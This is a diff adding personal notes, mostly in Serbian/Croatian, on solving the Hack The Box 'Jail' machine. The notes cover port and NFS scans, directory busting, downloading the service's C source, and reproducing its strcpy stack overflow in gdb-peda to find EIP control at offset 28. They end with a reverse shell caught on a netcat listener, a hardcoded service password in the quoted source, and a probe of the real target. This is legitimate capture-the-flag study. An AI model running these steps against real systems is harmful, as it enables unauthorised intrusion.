@@ -1,0 +1,1735 @@
+#trebalo mu je 100 godina
+root@kali:/home/kangus7/Documents# sudo nmap -p- -sV -sC -A -T5 -v 10.10.10.34
+*
+Not shown: 65529 filtered ports
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d (RSA)
+|   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef (ECDSA)
+|_  256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 (ED25519)
+80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
+| http-methods: 
+|   Supported Methods: POST OPTIONS GET HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+111/tcp   open  rpcbind    2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  3,4         2049/tcp  nfs
+|   100003  3,4         2049/udp  nfs
+|   100005  1,2,3      20048/tcp  mountd
+|   100005  1,2,3      20048/udp  mountd
+|   100021  1,3,4      37382/udp  nlockmgr
+|   100021  1,3,4      43629/tcp  nlockmgr
+|   100024  1          35812/udp  status
+|   100024  1          35886/tcp  status
+|   100227  3           2049/tcp  nfs_acl
+|_  100227  3           2049/udp  nfs_acl
+2049/tcp  open  nfs_acl    3 (RPC #100227) 		<- imamo NFS
+7411/tcp  open  daqstream?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    OK Ready. Send USER command.
+20048/tcp open  mountd     1-3 (RPC #100005)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+*
+
+#### imamo nfs na portu 2049
+#lista NSE skripti https://nmap.org/nsedoc/
+kangus7@kali:~$ sudo nmap -sV --script=nfs-ls 10.10.10.34
+[sudo] password for kangus7: 
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-03 21:44 CEST
+Nmap scan report for 10.10.10.34
+Host is up (0.035s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 6.6.1 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS))
+|_http-server-header: Apache/2.4.6 (CentOS)
+111/tcp  open  rpcbind 2-4 (RPC #100000)
+| nfs-ls: Volume /opt
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
+| rwxr-xr-x   0    0    33    2017-06-26T00:00:59  .
+| r-xr-xr-x   0    0    224   2017-06-25T10:43:12  ..
+| rwxr-x---   0    0    26    2017-06-26T13:50:21  logreader
+| rwxr-xr-x   0    0    6     2015-03-26T13:22:14  rh
+| 
+| 
+| Volume /var/nfsshare
+|_  access: NoRead Lookup NoModify NoExtend NoDelete NoExecute
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  3,4         2049/tcp  nfs
+|   100003  3,4         2049/udp  nfs
+|   100005  1,2,3      20048/tcp  mountd
+|   100005  1,2,3      20048/udp  mountd
+|   100021  1,3,4      35446/udp  nlockmgr
+|   100021  1,3,4      37016/tcp  nlockmgr
+|   100024  1          45641/tcp  status
+|   100024  1          48628/udp  status
+|   100227  3           2049/tcp  nfs_acl
+|_  100227  3           2049/udp  nfs_acl
+2049/tcp open  nfs_acl 3 (RPC #100227)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.22 seconds
+
+
+
+
+#### da utvrdimo o kojem se OS-u radi
+80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
+| http-methods: 
+|   Supported Methods: POST OPTIONS GET HEAD TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 (CentOS)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+
+
+https://access.redhat.com/solutions/445713
+Apache HTTP Server versions included in currently-supported products
+Red Hat Enterprise Linux (RHEL)1 - httpd rpms
+
+RHEL 5: based on upstream v2.2.3
+RHEL 6: based on upstream v2.2.15
+RHEL 7: based on upstream v2.4.6 		<- ovo je Centos 7
+RHEL 8: based on upstream v2.4.37
+
+
+
+#potpuno staticka stranica
+view-source:http://10.10.10.34/
+
+<pre>
+     \                  ###########                  /
+      \                  #########                  /
+       \                                           /
+        \                                         /
+         \                                       /
+          \                                     /
+           \                                   /
+            \_________________________________/
+            |                                 |
+            |                                 |
+            |                                 |
+            |            _________            |
+            |           |         |           |
+            |           |   ___   |           |
+            |           I  |___|  |           |
+            |           |         |           |
+            |           | J A I L |           |
+            |           |        _|           |
+            |           |       |#|           |  ;,
+    -- ___  |           |         |           |   ;'
+    H*/   ` |           |         |      _____|    .,`
+    */     )|           I         |     \_____\     ;'
+    /___.,';|           |         |     \\     \     ."`
+    |     ; |___________|_________|______\\     \      ;:
+    | ._,'  /                             \\     \      .
+    |,'    /                               \\     \
+    ||    /                                 \\_____\
+    ||   /                                   \_____|
+    ||  /              ___________                \
+    || /              / =====o    |                \
+    ||/              /  |   /-\   |                 \
+    //              /   |         |                  \
+   //              /    |   ____  |______             \
+  //              /    (O) |    | |      \             \
+ //              /         |____| |  0    \             \
+//              /          o----  |________\             \
+/              /                  |     |  |              \
+              /                   |        |               \
+             /                    |        |
+            /                     |        |
+</pre>
+
+
+
+###GoBuster
+Directory/file & DNS busting tool written in Go
+https://github.com/OJ/gobuster
+
+#instalacija
+kangus7@kali:~$ sudo apt install -y gobuster
+
+
+###Word liste i rockyou.txt
+sjelicic@Laki:~$ tree /usr/share/wordlists/
+/usr/share/wordlists/
+├── dirb -> /usr/share/dirb/wordlists
+├── dirbuster -> /usr/share/dirbuster/wordlists
+├── dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
+├── fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
+├── fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
+├── metasploit -> /usr/share/metasploit-framework/data/wordlists
+├── nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
+├── rockyou.txt.gz
+├── sqlmap.txt -> /usr/share/sqlmap/txt/wordlist.txt
+└── wfuzz -> /usr/share/wfuzz/wordlist
+
+rockyou.txt 				<- 123 MB passworda
+https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+
+
+kangus7@kali:~$ gobuster  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://10.10.10.34 -t 25
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.34/
+[+] Threads      : 25
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/07/02 22:27:46 Starting gobuster
+=====================================================
+/jailuser (Status: 301)
+=====================================================
+2019/07/02 22:33:19 Finished
+=====================================================
+
+HTTP status code 301	<- moved permanently
+
+
+#### povlaci sve sa masine
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail/http$ wget -r 10.10.10.34/jailuser/dev
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail/http$ cat compile.sh 
+# -z execstack disables DEP
+gcc -o jail jail.c -m32 -z execstack
+service jail stop
+cp jail /usr/local/bin/jail
+service jail start
+
+
+####podigao Centos 7 masinu za bluffer overflow zajebancije
+angus7@kali:~/pCloudDrive/OSCP/HTB/Jail/http$ ssh kangus7@192.168.85.130
+The authenticity of host '192.168.85.130 (192.168.85.130)' can't be established.
+ECDSA key fingerprint is SHA256:fz7aZ0LJyXyZG9pENLQuQWSAROY3kw3uYQGTXavrkw8.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.85.130' (ECDSA) to the list of known hosts.
+kangus7@192.168.85.130's password: 
+Last login: Wed Jul  3 22:13:54 2019
+[kangus7@localhost ~]$
+
+
+#kopirao fajlove na Centos masinu
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail/http$ scp * kangus7@192.168.85.130:/home/kangus7/jail
+kangus7@192.168.85.130's password: 
+compile.sh
+jail.c   
+
+#na Centos masini uklonio nepotrebne linije u compile.sh, dodao -ggdb
+#-ggdb
+Produce debugging information for use by GDB. This means to use the most expressive format available (DWARF, stabs, or the native format if neither of those are supported), including GDB extensions if at all possible.
+
+[kangus7@localhost jail]$ cat compile.sh 
+gcc -o jail jail.c -m32 -z execstack -ggdb
+
+### https://stackoverflow.com/questions/7412548/error-gnu-stubs-32-h-no-such-file-or-directory-while-compiling-nachos-source
+#nedostaje mi 32 bitni paket za glibc
+[kangus7@localhost jail]$ bash compile.sh 
+In file included from /usr/include/features.h:399:0,
+                 from /usr/include/stdio.h:27,
+                 from jail.c:1:
+/usr/include/gnu/stubs.h:7:27: fatal error: gnu/stubs-32.h: No such file or directory
+ # include <gnu/stubs-32.h>
+
+#nedostaje mi citav libgcc
+[kangus7@localhost jail]$ bash compile.sh 
+/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-redhat-linux/4.8.5/libgcc_s.so when searching for -lgcc_s
+/usr/bin/ld: cannot find -lgcc_s
+collect2: error: ld returned 1 exit status
+
+
+[kangus7@localhost jail]$ sudo yum install -y glibc-devel.i686 libgcc.x86_64 libgcc.i686
+
+[kangus7@localhost jail]$ bash compile.sh
+
+[kangus7@localhost jail]$ ls
+compile.sh  jail  jail.c
+[kangus7@localhost jail]$ gdb -q jail
+Reading symbols from /home/kangus7/jail/jail...done.
+(gdb) help list   					<- list linije source code-a, mogu da postavljam breakpointe na linije koda
+List specified function or line.
+With no argument, lists ten more lines after or around previous listing.
+"list -" lists the ten lines before a previous ten-line listing.
+One argument specifies a line, and ten lines are listed around that line.
+Two arguments with comma between specify starting and ending lines to list.
+Lines can be specified in these ways:
+  LINENUM, to list around that line in current file,
+  FILE:LINENUM, to list around that line in that file,
+  FUNCTION, to list around beginning of that function,
+  FILE:FUNCTION, to distinguish among like-named static functions.
+  *ADDRESS, to list around the line containing that address.
+With two args if one is empty it stands for ten lines away from the other arg.
+
+
+####on je imao instaliran gdb-peda
+PEDA - Python Exploit Development Assistance for GDB
+https://github.com/longld/peda
+
+[kangus7@localhost ~]$ git clone https://github.com/longld/peda.git ~/peda
+Cloning into '/home/kangus7/peda'...
+remote: Enumerating objects: 351, done.
+remote: Total 351 (delta 0), reused 0 (delta 0), pack-reused 351
+Receiving objects: 100% (351/351), 279.51 KiB | 0 bytes/s, done.
+Resolving deltas: 100% (220/220), done.
+[kangus7@localhost ~]$ echo "source ~/peda/peda.py" >> ~/.gdbinit
+
+
+[kangus7@localhost jail]$ gdb -q jail
+Reading symbols from /home/kangus7/jail/jail...done.
+gdb-peda$ 
+
+
+#### so he attaches the gdb to the program, run locally on the Centos 7 machine
+
+
+[kangus7@localhost ~]$ ps -ef | grep jail
+kangus7    8908      1 14 15:14 ?        00:01:47 /home/kangus7/jail/jail
+kangus7   23688  23669  0 15:26 pts/0    00:00:00 ./jail
+kangus7   23712  23694  0 15:27 pts/2    00:00:00 grep --color=auto jail
+
+
+#ps
+-e              Select all processes. Identical to -A.
+-f              Do full-format listing.
+
+
+#prikacio gdb na pid jail programa
+[kangus7@localhost ~]$ ps -ef | grep jail
+kangus7    8908      1 14 15:14 ?        00:01:47 /home/kangus7/jail/jail
+kangus7   23688  23669  0 15:26 pts/0    00:00:00 ./jail
+kangus7   23712  23694  0 15:27 pts/2    00:00:00 grep --color=auto jail
+[kangus7@localhost ~]$ gdb -q --pid=23688
+Attaching to process 23688
+Reading symbols from /home/kangus7/jail/jail...done.
+Reading symbols from /lib/libc.so.6...(no debugging symbols found)...done.
+Loaded symbols for /lib/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
+Loaded symbols for /lib/ld-linux.so.2
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xfffffe00 
+EBX: 0x5 
+ECX: 0xffe3f110 --> 0x3 
+EDX: 0xf777d000 --> 0x1c6d88 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xffe3f278 --> 0x0 
+ESP: 0xffe3f0fc --> 0xffe3f278 --> 0x0 
+EIP: 0xf778a430 (<__kernel_vsyscall+16>:	pop    ebp)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0xf778a42c <__kernel_vsyscall+12>:	nop
+   0xf778a42d <__kernel_vsyscall+13>:	nop
+   0xf778a42e <__kernel_vsyscall+14>:	int    0x80
+=> 0xf778a430 <__kernel_vsyscall+16>:	pop    ebp
+   0xf778a431 <__kernel_vsyscall+17>:	pop    edx
+   0xf778a432 <__kernel_vsyscall+18>:	pop    ecx
+   0xf778a433 <__kernel_vsyscall+19>:	ret    
+   0xf778a434:	add    BYTE PTR [esi],ch
+[------------------------------------stack-------------------------------------]
+0000| 0xffe3f0fc --> 0xffe3f278 --> 0x0 
+0004| 0xffe3f100 --> 0xf777d000 --> 0x1c6d88 
+0008| 0xffe3f104 --> 0xffe3f110 --> 0x3 
+0012| 0xffe3f108 --> 0xf76b5351 (<accept+33>:	mov    ebx,edx)
+0016| 0xffe3f10c --> 0x8048db8 (<main+369>:	mov    DWORD PTR [esp+0x154],eax)
+0020| 0xffe3f110 --> 0x3 
+0024| 0xffe3f114 --> 0xffe3f13c --> 0x380 
+0028| 0xffe3f118 --> 0xffe3f25c --> 0x10 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xf778a430 in __kernel_vsyscall ()
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-260.el7_6.5.i686
+gdb-peda$ 
+
+
+
+####za ovu error poruku (Missing separate debuginfos, use: debuginfo-install glibc-2.17-260.el7_6.5.i686)
+#https://stackoverflow.com/questions/10389988/missing-separate-debuginfos-use-debuginfo-install-glibc-2-12-1-47-el6-2-9-i686
+
+
+####
+By default, when a program forks, GDB will continue to debug the parent process and the child process will run unimpeded.
+If you want to follow the child process instead of the parent process, use the command set follow-fork-mode.
+
+set follow-fork-mode mode
+Set the debugger response to a program call of fork or vfork. A call to fork or vfork creates a new process. The mode argument can be:
+
+parent
+The original process is debugged after a fork. The child process runs unimpeded. This is the default.
+
+child
+The new process is debugged after a fork. The parent process runs unimpeded.
+
+#trenutno stanje u gdb-u, prati child fork
+gdb-peda$ show follow-fork-mode
+Debugger response to a program call of fork or vfork is "child".
+
+####
+On Linux, if you want to debug both the parent and child processes, use the command set detach-on-fork.
+
+set detach-on-fork mode
+Tells gdb whether to detach one of the processes after a fork, or retain debugger control over them both.
+
+on
+The child process (or parent process, depending on the value of follow-fork-mode) will be detached and allowed to run independently. This is the default.
+
+off
+Both processes will be held under the control of GDB. One process (child or parent, depending on the value of follow-fork-mode) is debugged as usual, while the other is held suspended.
+
+#trenutno stanje u gdb-u
+gdb-peda$ show detach-on-fork
+Whether gdb will detach the child of a fork is on.
+
+# ne zelim da gdb prati child fork, nego da ostane na parent procesu
+gdb-peda$ set detach-on-fork off
+
+gdb-peda$ run
+Starting program: /home/kangus7/jail/jail 
+
+####zato sto je proces bio ubijen tokom podesavanja
+[kangus7@localhost jail]$ ./jail 
+Killed
+
+
+#### nije mi se zezalo na Centos masini sa iptables, smo sam ga ugasio
+[kangus7@localhost jail]$ systemctl stop firewalld
+==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
+Authentication is required to manage system services or units.
+Authenticating as: kangus7
+Password: 
+==== AUTHENTICATION COMPLETE ===
+
+#### na Kali masini, sada slusam na datom portu sa netcat-om
+#### komande imam iz ource jail.c fajla
+kangus7@kali:~/Downloads$ nc 192.168.85.130 7411
+OK Ready. Send USER command.
+
+#Centos
+gdb-peda$ run
+Starting program: /home/kangus7/jail/jail 
+[New process 23720]
+
+#Kali
+kangus7@kali:~$ nc 192.168.85.130 7411
+OK Ready. Send USER command.
+
+
+gdb-peda$ run
+Starting program: /home/kangus7/jail/jail 
+[New process 23826]
+[Inferior 2 (process 23826) exited normally]
+Warning: not running
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-260.el7_6.5.i686
+#### list chil procese
+gdb-peda$ help info
+info inferiors -- IDs of specified inferiors (all inferiors if no argument)
+
+gdb-peda$ info inferior
+  Num  Description       Executable        
+* 2    <null>            /home/kangus7/jail/jail 
+  1    process 23825     /home/kangus7/jail/jail 
+
+gdb-peda$ help inferior
+Use this command to switch between inferiors.
+The new inferior ID must be currently known.
+
+#### vracam se nazad u parent procesor
+gdb-peda$ inferior 1
+[Switching to inferior 1 [process 23825] (/home/kangus7/jail/jail)]
+[Switching to thread 1 (process 23825)] 
+#0  0xf7fd9430 in __kernel_vsyscall ()
+
+#### nastavjamo sa izvrsavanjem programa
+
+gdb-peda$ continue
+Continuing.
+
+####KALI masina, slusamo na netcat-u
+kangus7@kali:~$ nc 192.168.85.130 7411
+OK Ready. Send USER command.
+DEBUG
+OK DEBUG mode on.
+USER admin
+OK Send PASS command.
+PASS fkdjhgjkh
+Debug: userpass buffer @ 0xffffccf0 		<- memorijska lokacija, u gdb landu, zbog run komande date u okviru gdb-a, ne debagujem native process memoriju nego idem preko gdb-a
+Incorrect username and/or password.
+ERR Authentication failed.
+
+
+#### ubijanje procesa
+[kangus7@localhost jail]$ pkill -9 jail
+
+####
+ponovo startovao jail proces
+nasao njegov pid
+startovao gdb sa tim pidom
+set detach-on-fork off
+ponovo isao preko netcat-a sa DEBUG opcijom
+info inferior
+inferior 1 da se vratim na parent proces
+####
+
+kangus7@kali:~$ nc 192.168.85.130 7411
+OK Ready. Send USER command.
+DEBUG
+OK DEBUG mode on.
+USER admin
+OK Send PASS command.
+PASS fjkgfjh
+Debug: userpass buffer @ 0xfffb3f10 			<- druga memorijska 
+Incorrect username and/or password.					lokacija
+ERR Authentication failed.
+
+
+#### postavio break point an liniju 22, liniju nakon strcpy
+gdb-peda$ list 1
+1	#include <stdio.h>
+2	#include <stdlib.h>
+3	#include <netdb.h>
+4	#include <netinet/in.h>
+5	#include <string.h>
+6	#include <unistd.h>
+7	#include <time.h>
+8	
+9	int debugmode;
+10	int handle(int sock);
+gdb-peda$ 
+11	int auth(char *username, char *password);
+12	
+13	int auth(char *username, char *password) {
+14	    char userpass[16];
+15	    char *response;
+16	    if (debugmode == 1) {
+17	        printf("Debug: userpass buffer @ %p\n", userpass);
+18	        fflush(stdout);
+19	    }
+20	    if (strcmp(username, "admin") != 0) return 0;
+gdb-peda$ 
+
+21	    strcpy(userpass, password); 			<- bluffer overflow
+
+22	    if (strcmp(userpass, "1974jailbreak!") == 0) {
+23	        return 1;
+24	    } else {
+25	        printf("Incorrect username and/or password.\n");
+26	        return 0;
+27	    }
+28	    return 0;
+29	}
+30	
+gdb-peda$ break 22
+Breakpoint 1 at 0x804885d: /home/kangus7/jail/jail.c:22. (2 locations)
+
+
+#### kali masina
+userpass promenljiva u jail.c je samo 16 bajta
+
+kangus7@kali:~$ python -c 'print "A" * 40'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+kangus7@kali:~$ nc 192.168.85.130 7411
+OK Ready. Send USER command.
+USER admin
+OK Send PASS command.
+PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   	<- program puca
+
+
+####Centos masina
+####u gdb-u:
+Breakpoint 1, auth (username=0x41414141 <Address 0x41414141 out of bounds>, password=0x41414141 <Address 0x41414141 out of bounds>) at jail.c:22
+22	    if (strcmp(userpass, "1974jailbreak!") == 0) {
+
+
+####
+http://visualgdb.com/gdbreference/commands/x
+x command
+Displays the memory contents at a given address using the specified format.
+
+Syntax
+x [Address expression]
+x /[Format] [Address expression]
+x /[Length][Format] [Address expression]
+
+Parameters
+
+Address expression
+Specifies the memory address which contents will be displayed. This can be the address itself or any C/C++ expression evaluating to address. The expression can include registers (e.g. $eip) and pseudoregisters (e.g. $pc). If the address expression is not specified, the command will continue displaying memory contents from the address where the previous instance of this command has finished.
+
+Format
+
+If specified, allows overriding the output format used by the command. Valid format specifiers are:
+o - octal
+x - hexadecimal
+d - decimal
+u - unsigned decimal
+t - binary
+f - floating point
+a - address
+c - char
+s - string
+i - instruction
+The following size modifiers are supported:
+
+b - byte
+h - halfword (16-bit value)
+w - word (32-bit value)
+g - giant word (64-bit value)
+
+Length
+Specifies the number of elements that will be displayed by this command.
+####
+
+#stampa (s)tringove u narednih 10 memoriskih lokacija
+#mem. lokacija 0xfffb3f10 iz DEBUG moda jail programa 
+gdb-peda$ x/10s 0xfffb3f10
+0xfffb3f10:	'A' <repeats 40 times> 		<- nas unos
+0xfffb3f39:	"\001"
+0xfffb3f3b:	""
+0xfffb3f3c:	""
+0xfffb3f3d:	""
+0xfffb3f3e:	""
+0xfffb3f3f:	""
+0xfffb3f40:	""
+0xfffb3f41:	""
+0xfffb3f42:	""
+
+#60 mem. lokacija u heksadecimalnom formatu
+gdb-peda$ x/60x 0xfffb3f00 		<- 16 bajtova pre
+0xfffb3f00:	0x10	0x3f	0xfb	0xff	0x4e	0x3f	0xfb	0xff
+0xfffb3f08:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
+0xfffb3f10:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xfffb3f18:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xfffb3f20:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xfffb3f28:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xfffb3f30:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0xfffb3f38:	0x00	0x01	0x00	0x00
+
+0x41 je A
+
+
+
+#### sada se prebacujemo na pyton pwntoools
+https://github.com/Gallopsled/pwntools
+http://docs.pwntools.com/en/stable/
+
+pip list 			<- da izlista instalirane module, nema pwntools
+pip install --upgrade pwntools 		<- instalira pwn tools
+
+
+#Centos masina
+gdb-peda$ help pattern
+Generate, search, or write a cyclic pattern to memory
+Set "pattern" option for basic/extended pattern type
+Usage:
+    pattern create size [file]
+    pattern offset value
+    pattern search
+    pattern patch address size
+    pattern arg size1 [size2,offset2]
+    pattern env size[,offset]
+
+####
+https://gef.readthedocs.io/en/latest/commands/pattern/
+Command pattern
+This command will create or search a De Bruijn cyclic pattern to facilitate determining offsets in memory.
+
+The sub-command create allows to create a new pattern
+
+
+
+
+
+gdb-peda$ pattern create 50 						<- ovo cemo koristiti za junk u exploit.py
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
+
+
+####nakon startovanja exploit.py, imamo buffer overflow, breakpoint se javlja
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ python exploit.py 
+[+] Opening connection to 192.168.85.130 on port 7411: Done
+[*] Closed connection to 192.168.85.130 port 7411
+
+
+Breakpoint 1, auth (username=0x41412941 <Address 0x41412941 out of bounds>, password=0x61414145 <Address 0x61414145 out of bounds>) at jail.c:22
+22	    if (strcmp(userpass, "1974jailbreak!") == 0) {
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-260.el7_6.5.i686
+gdb-peda$ continue
+#### imamo crash, yay!
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+
+
+
+
+
+
+
+
+
+
+
+
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0xf76d3000 --> 0x1c6d88 
+ECX: 0xf76de024 --> 0x0 
+EDX: 0xf76d4898 --> 0x0 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0x44414128 ('(AAD')
+ESP: 0xfff9bb30 ("A)AAEAAaAA0AAFAAbA\020?\373\377")
+
+####
+EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.
+####
+
+EIP: 0x413b4141 ('AA;A') 			<- na kojoj vrednosti je crash-ovao 
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x413b4141
+[------------------------------------stack-------------------------------------]
+0000| 0xfff9bb30 ("A)AAEAAaAA0AAFAAbA\020?\373\377")
+0004| 0xfff9bb34 ("EAAaAA0AAFAAbA\020?\373\377")
+0008| 0xfff9bb38 ("AA0AAFAAbA\020?\373\377")
+0012| 0xfff9bb3c ("AFAAbA\020?\373\377")
+0016| 0xfff9bb40 --> 0x3f104162 
+0020| 0xfff9bb44 --> 0xfffb 
+0024| 0xfff9bb48 --> 0x0 
+0028| 0xfff9bb4c --> 0x41410000 ('')
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x413b4141 in ?? ()
+gdb-peda$ 
+
+#### after 28 bytes we control EIP
+		slap some shellcode at that position and bob's your uncle
+gdb-peda$ pattern offset AA;A
+AA;A found at offset: 28
+gdb-peda$ info inferior
+  Num  Description       Executable        
+* 2    process 24720     /home/kangus7/jail/jail 
+  1    process 24712     /home/kangus7/jail/jail 
+gdb-peda$ inferior 1
+[Switching to inferior 1 [process 24712] (/home/kangus7/jail/jail)]
+[Switching to thread 1 (process 24712)] 
+#0  0xf76e0430 in __kernel_vsyscall ()
+gdb-peda$ continue
+Continuing.
+
+
+#### na Kali masini
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ python exploit.py 
+[+] Opening connection to 192.168.85.130 on port 7411: Done
+[*] Closed connection to 192.168.85.130 port 7411
+
+
+####Na Centos masini
+gdb-peda$ c
+Continuing.
+[New process 25006]
+[Switching to process 25006]
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xffb21d20 --> 0xcccccccc 
+EBX: 0xf7753000 --> 0x1c6d88 
+ECX: 0xffb21dc0 --> 0x5352e389 
+EDX: 0xffb21d82 --> 0x5352e389 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xffb21d38 --> 0xcccccccc 
+ESP: 0xffb21d10 --> 0xffb21d20 --> 0xcccccccc 
+EIP: 0x804885d (<auth+96>:	mov    DWORD PTR [esp+0x4],0x8048f17)
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048852 <auth+85>:	lea    eax,[ebp-0x18]
+   0x8048855 <auth+88>:	mov    DWORD PTR [esp],eax
+   0x8048858 <auth+91>:	call   0x8048620 <strcpy@plt>
+=> 0x804885d <auth+96>:	mov    DWORD PTR [esp+0x4],0x8048f17
+   0x8048865 <auth+104>:	lea    eax,[ebp-0x18]
+   0x8048868 <auth+107>:	mov    DWORD PTR [esp],eax
+   0x804886b <auth+110>:	call   0x80485b0 <strcmp@plt>
+   0x8048870 <auth+115>:	test   eax,eax
+[------------------------------------stack-------------------------------------]
+0000| 0xffb21d10 --> 0xffb21d20 --> 0xcccccccc 
+0004| 0xffb21d14 --> 0xffb21d5e --> 0x794980cd 
+0008| 0xffb21d18 --> 0x0 
+0012| 0xffb21d1c --> 0x0 
+0016| 0xffb21d20 --> 0xcccccccc 
+0020| 0xffb21d24 --> 0xcccccccc 
+0024| 0xffb21d28 --> 0xcccccccc 
+0028| 0xffb21d2c --> 0xcccccccc 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, auth (username=0x55a8c068 <Address 0x55a8c068 out of bounds>, password=0x68665e81 <Address 0x68665e81 out of bounds>) at jail.c:22
+22	    if (strcmp(userpass, "1974jailbreak!") == 0) {
+Missing separate debuginfos, use: debuginfo-install glibc-2.17-260.el7_6.5.i686
+gdb-peda$ c
+Continuing.
+
+# dobio sam shell, jebo me shell
+process 25006 is executing new program: /usr/bin/bash
+
+
+#### Na Kali masini
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ nc -lvnp 55555
+listening on [any] 55555 ...
+
+connect to [192.168.85.129] from (UNKNOWN) [192.168.85.130] 37644
+ls
+compile.sh
+jail
+jail.c
+
+#### kada uradim ls, zbog firewall-a koji blokira
+#mozemo uraditi socket reuse
+Missing separate debuginfos, use: debuginfo-install bash-4.2.46-31.el7.x86_64
+process 25007 is executing new program: /usr/bin/ls
+Missing separate debuginfos, use: debuginfo-install bash-4.2.46-31.el7.x86_64
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+[Inferior 10 (process 25007) exited normally]
+Warning: not running
+Missing separate debuginfos, use: debuginfo-install coreutils-8.22-23.el7.x86_64
+gdb-peda$ 
+
+
+#### sada probam ovaj exploit na samoj Jail masini
+	Jail - 10.10.10.34
+	Kali (na VPN-u) - 10.10.14.27
+
+kangus7@kali:~/pCloudDrive/OSCP/HTB/Jail$ nc 10.10.10.34 7411
+OK Ready. Send USER command.
+DEBUG
+OK DEBUG mode on.
+USER admin
+OK Send PASS command.
+PASS fkgfjh
+Debug: userpass buffer @ 0xffffd610 		<- mem. lokacija
+Incorrect username and/or password.
+ERR Authentication failed.
